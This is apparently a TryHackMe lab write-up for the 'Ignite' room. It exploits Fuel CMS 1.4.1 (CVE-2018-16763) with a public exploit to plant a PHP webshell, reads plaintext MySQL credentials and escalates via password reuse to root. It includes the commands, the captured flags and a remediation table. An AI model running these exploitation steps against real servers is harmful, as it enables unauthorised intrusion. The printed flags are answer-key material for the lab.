# Ignite | TryHackMe Write-up

> **TL;DR:** Identified Fuel CMS 1.4.1 on port 80, exploited its unauthenticated SSTI/RCE (CVE-2018-16763) for a `www-data` webshell, read the CMS database config to recover the MySQL root password `mememe`, then used that same credential with `su root` for full system access - a textbook credential-reuse escalation.

|  |  |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Ignite](https://tryhackme.com/room/ignite) |
| **Difficulty** | Easy |
| **Category** | Linux · CMS exploitation · credential reuse |
| **Date completed** | 2026-07-12 |
| **Author** | Kevin Jose |

**Tools used:** `nmap` · `gobuster` · `searchsploit` · CVE-2018-16763 RCE exploit (EDB-50477 / Podalirius console.py) · `mysql` · `su`
**Vulnerabilities covered:** Fuel CMS 1.4.1 unauthenticated RCE (CVE-2018-16763 / CWE-94) · Plaintext database credentials in config file (CWE-312) · Password reuse across MySQL and OS root (CWE-521)

---

## 1. Overview

Ignite is an Easy-rated Linux box built around an unpatched Fuel CMS installation. The web application's version is announced on the default landing page, making identification trivial. A public exploit for CVE-2018-16763 gives unauthenticated code execution immediately. From the resulting `www-data` webshell, the CMS database config file exposes the MySQL root password in plaintext, and that same password is reused on the OS root account - making privilege escalation a single `su root` command. No binary exploitation or SUID abuse is needed; the box falls entirely on patch management and credential hygiene.

> **Note:** TryHackMe assigns a fresh IP each time the machine is deployed, so the target address differs between screenshots. Commands below use `$IP` as a placeholder - set it once per session with `export IP=<machine-ip>` and every command resolves automatically.

---

## 2. Reconnaissance

**Service scan:**

```bash
nmap -sV $IP | tee ignite_nmap.log
```

Key findings - **1 interesting port**:

- **80/tcp** - Apache httpd 2.4.18

The remaining open ports (21 FTP, 443 HTTPS, 554 RTSP, 1723 PPTP) return no usable service banners. The web application on port 80 is the only actionable surface.

---

## 3. Enumeration

### Web content discovery

```bash
gobuster dir \
  -u http://$IP \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html \
  -o ignite_gobuster.txt
```

Notable results:

```
/index       (Status: 200)
/home        (Status: 200)
/0           (Status: 200)
/assets      (Status: 301)
/robots.txt  (Status: 200)
```

### CMS identification

The landing page at `http://$IP/` displays the Fuel CMS default welcome screen, explicitly stating the installed version: **Fuel CMS 1.4.1**. No authentication or guesswork required - the version is self-advertised.

---

## 4. Exploitation - Initial Foothold

**Vulnerability:** Fuel CMS 1.4.1 unauthenticated Server-Side Template Injection / Remote Code Execution - **CVE-2018-16763**

**Why it works:** Fuel CMS 1.4.1 passes user-supplied input directly into PHP's `eval()` function through the CMS's `fuel/modules/fuel/libraries/Fuel_tags.php` without sanitisation. An unauthenticated attacker can inject arbitrary PHP code via the `fuel/pages/select/?filter=` endpoint and execute OS commands on the server.

**Steps**

1. Search for available exploits:

   ```bash
   searchsploit fuel cms
   ```

   Returns multiple entries for Fuel CMS 1.4.1, all targeting CVE-2018-16763. Selected EDB-50477 (Python, most recent):

   ```bash
   searchsploit -m 50477
   ```

2. Alternatively, used the Podalirius interactive console exploit for a cleaner webshell:

   ```bash
   cd CVE-2018-16763-FuelCMS-1.4.1-RCE/
   python3 console.py -t http://$IP
   ```

   The exploit uploads a PHP web shell and drops into an interactive command prompt:

   ```
   [+] Shell was uploaded in http://$IP/34928021cb5e4f79aea524d38d72ba94.php
   [webshell]>
   ```

3. Enumerate the filesystem and recover the user flag:

   ```bash
   [webshell]> ls -la /home
   # drwx--x--x  2 www-data www-data  4096 Jul 26 2019 www-data

   [webshell]> ls -la /home/www-data
   # -rw-r--r-- 1 root root  34 Jul 26 2019 flag.txt

   [webshell]> cat /home/www-data/flag.txt
   ```

**Result:** Webshell as `www-data`.

**User flag:** `6470e394cbf6dab6a91682cc8585059b`

---

## 5. Post-Exploitation - Database Enumeration

From the webshell, ran MySQL queries directly using credentials found in the CMS config (see Section 6):

```bash
mysql -u root -pmememe -e "show databases;"
# fuel_schema, information_schema, mysql, performance_schema, sys

mysql -u root -pmememe fuel_schema -e "show tables;"
# fuel_archives, fuel_blocks, fuel_categories, fuel_logs, fuel_pages, fuel_users ...

mysql -u root -pmememe fuel_schema -e "select * from fuel_users;"
# id: 1  user_name: admin  password: f9f6785b4cec20c44c068b6d64e4ca31804dd4e5
```

The admin's password hash (`f9f6785b4cec20c44c068b6d64e4ca31804dd4e5` - SHA1) was recovered but was not needed to progress, since the config file credential gave direct root access.

---

## 6. Privilege Escalation

**Vector:** Plaintext database password in CMS config reused as the OS root password.

**Why it works:** Fuel CMS stores its database credentials in plaintext in `fuel/application/config/database.php`. Here the `root` MySQL account shares its password (`mememe`) with the OS `root` account - so reading the config file is equivalent to reading the root password.

**Steps**

1. Read the Fuel CMS database config from the webshell:

   ```
   [webshell]> cat /var/www/html/fuel/application/config/database.php
   ```

   Key section:

   ```php
   $db['default'] = array(
       'hostname' => 'localhost',
       'username' => 'root',
       'password' => 'mememe',
       'database' => 'fuel_schema',
       ...
   );
   ```

2. On a proper shell (obtained via the webshell or a reverse shell), switch to root using the recovered password:

   ```bash
   www-data@ubuntu:/$ su root
   Password: mememe
   ```

3. Read the root flag:

   ```bash
   root@ubuntu:/# cd root
   root@ubuntu:~# cat root.txt
   ```

**Result:** Root shell via credential reuse.

**Root flag:** `b9bbcb33e11b80be759c4e844862482d`

---

## 7. Remediation

| Finding | Risk | Remediation |
|---|---|---|
| Fuel CMS 1.4.1 - CVE-2018-16763 (unauthenticated RCE) | Full server compromise without authentication | Upgrade Fuel CMS to a patched version; keep CMS software patched and enable auto-update where possible. |
| CMS version disclosed on default landing page | Attacker identifies exact exploit target immediately | Customise or remove the default installation page; suppress server/application version banners. |
| Plaintext database password in config file | Config file read → credential recovery | Restrict config file permissions (readable by web process only); use environment variables or a secrets manager rather than hardcoded plaintext credentials. |
| MySQL root password reused as OS root password | Database credential → full OS compromise | Never reuse credentials across services; use a unique, strong password for each account; apply least privilege (the CMS does not need the MySQL root account). |

---

## 8. Lessons Learned

- The version disclosure on the CMS default page made this trivially exploitable - removing or customising default installation pages is an easy hardening win that would meaningfully slow down an attacker.
- CVE-2018-16763 is four lines of PHP `eval()` abuse; the fix is one upgrade. This box is a strong reminder that patch management is not optional.
- Credential reuse turned a `www-data` webshell into root in a single command - the database config file was the pivot point. Rotating and isolating credentials per service would have broken the chain entirely.

---

## 9. References

- Room: https://tryhackme.com/room/ignite
- CVE-2018-16763 (Fuel CMS 1.4.1 RCE): https://nvd.nist.gov/vuln/detail/CVE-2018-16763
- Exploit-DB 50477 (Python): https://www.exploit-db.com/exploits/50477
- CWE-94: Improper Control of Generation of Code - https://cwe.mitre.org/data/definitions/94.html
- CWE-312: Cleartext Storage of Sensitive Information - https://cwe.mitre.org/data/definitions/312.html

---

*Lab conducted in an authorised, isolated training environment (TryHackMe). All activity was performed against systems I am explicitly permitted to test.*